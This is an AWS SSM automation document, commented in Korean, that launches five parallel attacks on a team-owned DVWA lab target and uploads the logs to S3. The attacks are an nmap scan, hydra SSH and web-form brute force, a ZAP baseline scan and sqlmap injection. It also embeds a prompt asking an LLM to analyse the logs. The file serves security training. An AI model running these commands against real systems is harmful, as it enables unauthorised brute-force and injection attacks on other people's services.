schemaVersion: '2.2'
description: |
  지리별 공격자 노드에서 파리(홈 리전) DVWA 대상으로 자동 공격을 실행한다.
  ① nmap 포트/서비스 스캔  ② hydra SSH 무차별 대입  ③ hydra DVWA 웹 로그인 무차별 대입
  ④ OWASP ZAP 베이스라인 스캔  ⑤ sqlmap SQL 주입 점검.
  5개를 전부 동시 실행한다(t3.medium 4GB 전제 — t3.micro/small 에서 5개를 한꺼번에
  돌리면 자원 고갈로 SSM 에이전트까지 죽을 수 있다. 2026-09-29 뭄바이·도쿄 사고 참고).
  결과는 S3(스캔 결과 버킷)에 .txt(원본 출력 합본)와 .json(단계별 구조화, 2026-09-29 추가)
  둘 다 업로드한다. 대시보드 "전부 실행"이 호출한다. 격리된 팀 소유 실습 대상(DVWA)에만 사용한다.
parameters:
  TargetHost:
    type: String
    description: 공격 대상 DVWA 공인 IP (terraform output web_dvwa_public_ip)
    allowedPattern: '^[0-9]{1,3}(\.[0-9]{1,3}){3}$'
  ScanBucket:
    type: String
    description: 결과를 올릴 S3 버킷
  RegionLabel:
    type: String
    description: '공격 출발 지역 표기 (예: us-virginia)'
    default: unknown
  SshUser:
    type: String
    description: SSH 무차별 대입 대상 계정
    default: victim
  WebBaseUrl:
    type: String
    description: |
      DVWA 웹 공격 대상 베이스 URL — ALB(WAF 경유), 예: http://<alb-dns>:8081.
      WAF 를 타야 빨간 흐름선이 뜨므로 DVWA IP 직접(:80 filtered)이 아닌 ALB 를 대상으로 한다.
      스크립트가 이 URL 로 자동 로그인해 PHPSESSID 를 얻는다(수동 입력 불필요). 비우면 웹 공격 생략.
    default: ''
  RunToken:
    type: String
    description: |
      S3 파일명(스크립트가 만드는 $TS 대신 이걸 쓴다). 백엔드가 SendCommand 전에 미리 만들어
      넘긴다 — 그래야 결과를 기다리지 않고도 다운로드 키를 바로 알 수 있다(2026-09-29 추가).
      SSM 표준출력은 24,000자에서 잘려서, 스크립트가 찍는 "uploaded to s3://..." 마지막 줄을
      못 읽는 경우가 있었다(ZAP+sqlmap 출력이 길 때) — 그 파싱 의존을 없앤다.
    allowedPattern: '^[a-f0-9]{32}$'
mainSteps:
  - action: 'aws:runShellScript'
    name: geoWebAttack
    inputs:
      runCommand:
        - '#!/bin/bash'
        - set -uo pipefail
        - TS=$(date +%Y%m%dT%H%M%SZ)
        - 'OUT="/tmp/atk-{{ RegionLabel }}-$TS.txt"'
        - 'D=$(mktemp -d)'
        - 'echo "== ATK from {{ RegionLabel }} -> {{ TargetHost }} @ $TS (5-way 병렬) ==" > "$OUT"'
        - '# 부팅 시 만든 attacker 이미지가 준비될 때까지 잠깐 대기'
        - 'for i in $(seq 1 30); do [ -f /opt/attacker/READY ] && break; sleep 5; done'
        - '# 결과 업로드에 AWS CLI 가 필요한데 공격 노드 부팅 스크립트는 docker·nmap·hydra 만 설치한다. 없으면 여기서 설치한다.'
        - 'if ! command -v aws >/dev/null 2>&1; then'
        - '  command -v unzip >/dev/null 2>&1 || { apt-get update -qq && apt-get install -y -qq unzip; } >/dev/null 2>&1'
        - '  ( cd /tmp && curl -fsSL "https://awscli.amazonaws.com/awscli-exe-linux-$(uname -m).zip" -o awscliv2.zip && unzip -oq awscliv2.zip && ./aws/install --update ) >/dev/null 2>&1'
        - 'fi'
        - WL=/opt/attacker/wordlists
        - '# 로그인은 빠르고(1~2초) ③⑤ 가 세션을 써야 하므로 병렬 시작 전에 동기적으로 먼저 한다.'
        - JAR=$(mktemp)
        - 'SID=""; WHOST=""; WPORT=""'
        - 'if [ -n "{{ WebBaseUrl }}" ]; then'
        - '  TOKEN=$(curl -s -c "$JAR" "{{ WebBaseUrl }}/login.php" | grep -oE "[0-9a-f]{32}" | head -1)'
        - '  curl -s -b "$JAR" -c "$JAR" --data "username=admin&password=password&Login=Login&user_token=$TOKEN" "{{ WebBaseUrl }}/login.php" -o /dev/null'
        - '  SID=$(awk "/PHPSESSID/{print \$7}" "$JAR" | tail -1)'
        - '  HP=$(echo "{{ WebBaseUrl }}" | sed -E "s#https?://##; s#/.*##"); WHOST=${HP%%:*}; WPORT=${HP##*:}; [ "$WPORT" = "$WHOST" ] && WPORT=80'
        - 'fi'
        - ''
        - '# --- 5개 전부 동시 실행 (t3.medium 4GB 전제) --------------------------------------'
        - '# nmap 은 자주 쓰는 포트만 본다(전체 -p- 는 필터링된 포트 재전송으로 5~15분씩 걸림).'
        - '{ echo "== [1] nmap =="; docker run --rm attacker:latest nmap -Pn -sV -T4 -p 22,80,443,3306,8080,8081 "{{ TargetHost }}"; } >"$D/1-nmap.txt" 2>&1 &'
        - '{ echo "== [2] hydra ssh ({{ SshUser }}) =="; docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P /wl/pass.txt -t 8 -I "ssh://{{ TargetHost }}"; } >"$D/2-hydra-ssh.txt" 2>&1 &'
        - 'if [ -n "{{ WebBaseUrl }}" ]; then'
        - '  { echo "== [3] hydra dvwa web (session $SID) =="; docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 8 -s "$WPORT" "$WHOST" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\: PHPSESSID=$SID; security=low"; } >"$D/3-hydra-web.txt" 2>&1 &'
        - '  { echo "== [4] zap baseline =="; docker run --rm zaproxy/zap-stable zap-baseline.py -t "{{ WebBaseUrl }}" -I; } >"$D/4-zap.txt" 2>&1 &'
        - '  { echo "== [5] sqlmap =="; docker run --rm attacker:latest sqlmap -u "{{ WebBaseUrl }}/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SID; security=low" --random-agent --batch --level=2 --risk=2; } >"$D/5-sqlmap.txt" 2>&1 &'
        - 'else'
        - '  echo "== [3-5] dvwa web/zap/sqlmap skipped (WebBaseUrl 미지정) ==" >"$D/3-hydra-web.txt"'
        - 'fi'
        - 'wait'
        - ''
        - 'cat "$D"/*.txt >> "$OUT" 2>/dev/null'
        - ''
        - '# --- 단계별 구조화 JSON 생성 (분석 프롬프트 포함) ---------------------------------'
        - '# 값은 env 로 넘겨 파이썬이 os.environ 으로 읽는다 → 셸/JSON 따옴표 충돌·인젝션 회피.'
        - '# python3 는 Ubuntu 클라우드 이미지 기본 포함(cloud-init 이 씀). 혹시 없으면 설치.'
        - 'command -v python3 >/dev/null || (sudo apt-get update -y && sudo apt-get install -y python3)'
        - 'OUTJSON="/tmp/atk-{{ RegionLabel }}-$TS.json"'
        - 'export ATK_REGION="{{ RegionLabel }}" ATK_TARGET="{{ TargetHost }}" ATK_WEBURL="{{ WebBaseUrl }}" ATK_TS="$TS" ATK_DIR="$D" ATK_OUT="$OUTJSON"'
        - |
          python3 - <<'PYEOF'
          import json, glob, os
          d = os.environ["ATK_DIR"]
          steps = []
          for f in sorted(glob.glob(os.path.join(d, "*.txt"))):
              base = os.path.basename(f)
              # 1-nmap.txt -> "nmap"
              name = base.split("-", 1)[-1].rsplit(".", 1)[0] if "-" in base else base
              with open(f, encoding="utf-8", errors="replace") as fh:
                  steps.append({"step": name, "file": base, "output": fh.read()})
          # 이 프롬프트는 JSON 마다 무조건 포함된다. 추출한 JSON 을 그대로 분석 도구/LLM 에 넣으면
          # 근거 기반 분석 자료가 나오도록 지시한다.
          prompt = (
              "다음 JSON 은 격리된 팀 소유 실습 환경(DVWA)에서 수행한 모의 공격 로그다. "
              "steps 배열의 각 단계(nmap 포트 스캔·hydra SSH/웹 무차별 대입·ZAP 베이스라인·sqlmap SQL 주입)의 "
              "output 에 실제로 나타난 사실만 근거로, 정확한 보안 분석 자료를 작성하라. "
              "각 단계별로 (1) 무엇을 시도했는지, (2) 실제로 성공/발견된 것(열린 포트, 유효 자격증명, 취약점, 주입 지점 등), "
              "(3) 위험도와 근거, (4) 권고 대응을 정리하라. "
              "로그에 근거가 없는 내용은 추측·과장하지 말고 '근거 없음'으로 명시하라. "
              "출력에 없는 자격증명·취약점을 지어내지 마라."
          )
          result = {
              "analysisPrompt": prompt,
              "regionLabel": os.environ.get("ATK_REGION", ""),
              "targetHost": os.environ.get("ATK_TARGET", ""),
              "webBaseUrl": os.environ.get("ATK_WEBURL", ""),
              "timestamp": os.environ.get("ATK_TS", ""),
              "steps": steps,
          }
          with open(os.environ["ATK_OUT"], "w", encoding="utf-8") as fh:
              json.dump(result, fh, ensure_ascii=False, indent=2)
          PYEOF
        - 'rm -rf "$D" "$JAR"'
        - '# 결과 업로드 (지역별 프리픽스). 파일명은 RunToken — 백엔드가 이미 알고 있는 값이라'
        - '# 출력 파싱 없이 바로 다운로드 링크를 만들 수 있다. $TS 는 파일 내용(로그) 쪽에만 남는다.'
        - '# 업로드가 하나라도 실패하면 명령을 실패로 끝낸다. 예전엔 실패해도 아래 echo 가 찍혀 SSM 이 Success 로 보였고, 보고서만 조용히 비었다.'
        - 'UP=0'
        - 'aws s3 cp "$OUT" "s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/{{ RunToken }}.txt" || UP=1'
        - 'aws s3 cp "$OUTJSON" "s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/{{ RunToken }}.json" || UP=1'
        - 'if [ "$UP" = 0 ]; then echo "uploaded to s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/{{ RunToken }}.{txt,json} (generated at $TS)"; else echo "UPLOAD FAILED to s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/{{ RunToken }}" >&2; exit 1; fi'
